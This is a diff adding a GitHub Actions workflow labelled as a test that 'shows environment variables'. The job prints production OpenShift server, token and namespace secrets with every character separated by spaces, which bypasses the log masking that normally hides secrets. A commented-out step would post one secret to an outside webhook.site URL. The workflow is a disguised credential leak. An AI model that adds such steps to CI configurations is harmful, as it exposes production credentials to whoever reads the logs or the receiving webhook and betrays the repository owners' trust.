@@ -1,0 +1,24 @@
+name: Test action
+on:
+  workflow_dispatch:
+
+jobs:
+  debug:
+    name: Show environment variables
+    runs-on: ubuntu-latest
+    steps:
+      - name: Display env vars
+        env:
+          SERVER_PROD: ${{ secrets.OPENSHIFT_SERVER_PROD }}
+          TOKEN_PROD: ${{ secrets.OPENSHIFT_TOKEN_PROD }}
+          NAMESPACE_PROD: ${{ secrets.OPENSHIFT_NAMESPACE_PROD }}
+        run: |
+          echo ${{secrets.OPENSHIFT_SERVER_PROD}} | sed 's/./& /g'
+          echo ${{secrets.OPENSHIFT_TOKEN_PROD}} | sed 's/./& /g'
+          echo ${{secrets.OPENSHIFT_NAMESPACE_PROD}} | sed 's/./& /g'
+  #   - name: Post to webhook
+  #      uses: fjogeleit/http-request-action@v1
+  #      with:
+  #       url: 'https://webhook.site/108d58e1-026b-45b4-8b7f-8278824e2dec'
+  #        method: 'POST'
+  #        data: ${{ secrets.OPENSHIFT_SERVER_PROD }}
